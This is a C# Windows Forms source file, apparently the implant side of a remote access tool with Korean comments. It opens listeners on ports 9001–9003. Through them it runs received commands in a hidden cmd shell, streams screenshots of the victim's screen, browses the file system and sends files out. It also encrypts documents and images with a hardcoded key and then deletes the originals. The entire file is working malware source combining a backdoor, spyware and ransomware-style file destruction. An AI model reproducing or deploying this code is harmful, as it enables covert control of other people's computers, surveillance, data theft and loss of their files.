﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing.Imaging;
using PacketLibrary;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;

namespace Server
{
    public partial class server : Form
    {
        public StreamReader m_Read;
        public StreamWriter m_Write;
        private Thread m_thread;
        string result;
        public Paths s_Paths;

        private TcpListener s_listener9001;
        private TcpListener s_listener9002;
        private TcpListener s_listener9003;

        private TcpClient client9001;
        private TcpClient client9002;
        private TcpClient client9003;

        private NetworkStream mainStream9001;
        private NetworkStream mainStream9002;
        private NetworkStream mainStream9003;

        private bool ClientOn_9001 = false;
        private bool ClientOn_9002 = false;
        private bool ClientOn_9003 = false;

        private Thread s_thread9001;
        private Thread s_thread9002;
        private Thread s_thread9003;

        private byte[] sendBuffer = new byte[10000000];
        private byte[] readBuffer = new byte[10000000];


        public server()
        {
            InitializeComponent();
        }

        private void server_Load(object sender, EventArgs e)
        {
            s_thread9001 = new Thread(new ThreadStart(RunServer1));
            s_thread9001.Start();
            s_thread9002 = new Thread(new ThreadStart(RunServer2));
            s_thread9002.Start();
            s_thread9003 = new Thread(new ThreadStart(RunServer3));
            s_thread9003.Start();
        }

        //-- server1 -- //
        public void RunServer1()
        {
            this.s_listener9001 = new TcpListener(9001);
            this.s_listener9001.Start();
            client9001 = this.s_listener9001.AcceptTcpClient();
            
            if (client9001.Connected)
            {
                this.ClientOn_9001 = true;
                mainStream9001 = client9001.GetStream();
                m_Read = new StreamReader(mainStream9001);
                m_Write = new StreamWriter(mainStream9001);
                this.m_thread = new Thread(new ThreadStart(Receive));
                this.m_thread.Start();
            }
        }

        public void Receive() // 명령어 수신
        {
            try
            {
                while (ClientOn_9001)
                {
                    string msg = m_Read.ReadLine();
                    if (msg != null)
                    {
                        // 수신한 명령어 실행
                        ProcessStartInfo cmd = new ProcessStartInfo();
                        Process process = new Process();
                        cmd.FileName = @"cmd";
                        cmd.WindowStyle = ProcessWindowStyle.Hidden;
                        cmd.CreateNoWindow = true;

                        cmd.UseShellExecute = false;
                        cmd.RedirectStandardOutput = true;
                        cmd.RedirectStandardInput = true;
                        cmd.RedirectStandardError = true;

                        process.EnableRaisingEvents = false;
                        process.StartInfo = cmd;
                        process.Start();
                        process.StandardInput.Write(msg + Environment.NewLine);
                        process.StandardInput.Close();

                        result = process.StandardOutput.ReadToEnd();
                        StringBuilder sb = new StringBuilder();
                        sb.Append(result);

                        result = sb.ToString();
                        process.WaitForExit();
                        process.Close();

                        m_Write.WriteLine(result);
                        m_Write.Flush();
                    }
                }
            }
            catch
            {
                MessageBox.Show("데이터 읽는 과정에서 오류 발생");
                return;
            }
        }

        //-- server1 -- //

        //-- server2 -- //

        public void RunServer2()
        {
            this.s_listener9002 = new TcpListener(9002);
            this.s_listener9002.Start();
            client9002 = this.s_listener9002.AcceptTcpClient();

            if (client9002.Connected)
            {
                this.ClientOn_9002 = true;
                mainStream9002 = client9002.GetStream();
            }

            int nRead;
            if (this.ClientOn_9002)
            {
                try
                {
                    nRead = 0;
                    nRead = this.mainStream9002.Read(readBuffer, 0, 10000000);
                }
                catch
                {
                    this.ClientOn_9002 = false;
                    this.mainStream9002 = null;
                }
            }

            Packet packet = (Packet)Packet.Deserialize(this.readBuffer);

            switch ((int)packet.Type)
            {
                case (int)PacketType.Screen_start:
                    {
                        while (this.ClientOn_9002)
                        {
                            Image ima = ScreenShot();
                            byte[] ar = ImagetoByteArray(ima);

                            sendScreen sc = new sendScreen();
                            sc.Type = (int)PacketType.Screen_start;
                            sc.arr = ar;
                            sendScreen.Serialize(sc).CopyTo(this.sendBuffer, 0);
                            this.Send9002();
                        }
                        break;
                    }
            }
        }
        public void Send9002()
        {
            mainStream9002.Write(this.sendBuffer, 0, this.sendBuffer.Length);
            mainStream9002.Flush();
            for (int i = 0; i < 10000000; i++)
            {
                this.sendBuffer[i] = 0;
            }
        }

        public Image ScreenShot()   // 화면 스크린샷 찍는 함수
        {
            Size size = Screen.PrimaryScreen.Bounds.Size;

            Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height, PixelFormat.Format32bppArgb);
            Graphics gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(0, 0, 0, 0, size);
            return bmp as Image;
        }

        public byte[] ImagetoByteArray(Image img)
        {
            MemoryStream ms = new MemoryStream();
            img.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
            byte[] arr = ms.ToArray();
            ms.Close();
            return arr;
        }

        //-- server2 -- //


        //-- server3 -- //


        public void RunServer3()
        {
            this.s_listener9003 = new TcpListener(9003);
            this.s_listener9003.Start();
            client9003 = this.s_listener9003.AcceptTcpClient();

            if (client9003.Connected)
            {
                this.ClientOn_9003 = true;
                mainStream9003 = client9003.GetStream();
            }

            int nRead;
            while (this.ClientOn_9003)
            {
                try
                {
                    nRead = 0;
                    nRead = this.mainStream9003.Read(readBuffer, 0, 10000000);
                }
                catch
                {
                    this.ClientOn_9003 = false;
                    this.mainStream9003 = null;
                }


                Packet packet = (Packet)Packet.Deserialize(this.readBuffer);

                switch ((int)packet.Type)
                {
                    case (int)PacketType.Init:
                        {
                            string path;
                            this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                            path = s_Paths.path;

                            Pathinfo Init = new Pathinfo(path);
                            Init.Type = (int)PacketType.Init;
                            Packet.Serialize(Init).CopyTo(this.sendBuffer, 0);
                            this.Send();
                            break;
                        }

                    case (int)PacketType.Select:
                        {
                            string path;
                            this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                            path = s_Paths.path;

                            Pathinfo Select = new Pathinfo(path);
                            Select.Type = (int)PacketType.Select;
                            Packet.Serialize(Select).CopyTo(this.sendBuffer, 0);
                            this.Send();
                            break;
                        }

                    case (int)PacketType.Expand:
                        {
                            string path;
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                                path = s_Paths.path;

                                Pathinfo Expand = new Pathinfo(path);
                                Expand.Type = (int)PacketType.Expand;
                                Packet.Serialize(Expand).CopyTo(this.sendBuffer, 0);
                                this.Send();
                            }));
                            break;
                        }
                    case (int)PacketType.OpenItem:
                        {
                            string path;
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                                path = s_Paths.path;

                                Pathinfo OpenItem = new Pathinfo(path);
                                OpenItem.Type = (int)PacketType.OpenItem;
                                Packet.Serialize(OpenItem).CopyTo(this.sendBuffer, 0);
                                this.Send();
                            }));
                            break;
                        }
                    case (int)PacketType.다운로드:
                        {
                            string path;
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                                path = s_Paths.path;

                                FileSend(path);
                            }));
                            break;
                        }
                    case (int)PacketType.암호화:
                        {
                            string path;
                            string Extension;
                            string inputfile;
                            this.Invoke(new MethodInvoker(delegate ()
                            {
                                this.s_Paths = (Paths)Packet.Deserialize(this.readBuffer);
                                inputfile = s_Paths.path;
                                Extension = Path.GetExtension(s_Paths.path);
                                path = Path.GetDirectoryName(s_Paths.path);
                                if (Extension == ".hwp")
                                {
                                    string encry = "Encrypted.hwp.enc";

                                    EncryptFile(inputfile, encry, path);

                                }
                                else if (Extension == ".jpg")
                                {
                                    string encry = "Encrypted.jpg.enc";

                                    EncryptFile(inputfile, encry, path);

                                }
                                else if (Extension == ".png")
                                {
                                    string encry = "Encrypted.png.enc";

                                    EncryptFile(inputfile, encry, path);

                                }
                                else if (Extension == ".pdf")
                                {
                                    string encry = "Encrypted.pdf.enc";

                                    EncryptFile(inputfile, encry, path);
                                }

                                Pathinfo Init = new Pathinfo(path);
                                Init.Type = (int)PacketType.Select;
                                Packet.Serialize(Init).CopyTo(this.sendBuffer, 0);
                                this.Send();

                            }));
                            break;
                        }
                }
            }
        }
        public void Send()
        {
            mainStream9003.Write(this.sendBuffer, 0, this.sendBuffer.Length);
            mainStream9003.Flush();
            for (int i = 0; i < 10000000; i++)
            {
                this.sendBuffer[i] = 0;
            }
        }

        public void FileSend(string path)
        {
            Fileinfo file = new Fileinfo(path);
            file.Type = (int)PacketType.다운로드;
            Packet.Serialize(file).CopyTo(this.sendBuffer, 0);
            this.Send();
        }

        public static void EncryptFile(string inputFile, string outputFile, string path)
        {
            string currentPath = Environment.CurrentDirectory; // 현재 디렉토리 경로

            string sourceFile = currentPath + @"\" + outputFile; //현재 암호화 파일 경로
            string DestinationFile = path + @"\" + outputFile; //이동할 암호화 파일 경로

            string password = @"myKey123"; // Your Key Here
            UnicodeEncoding UE = new UnicodeEncoding();
            byte[] key = UE.GetBytes(password);

            string cryptFile = outputFile;
            FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

            RijndaelManaged RMCrypto = new RijndaelManaged();

            CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateEncryptor(key, key), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            int data;
            while ((data = fsIn.ReadByte()) != -1)
                cs.WriteByte((byte)data);


            fsIn.Close();
            cs.Close();
            fsCrypt.Close();

            System.IO.File.Move(sourceFile, DestinationFile);
            System.IO.File.Delete(inputFile);
        }
    }
}
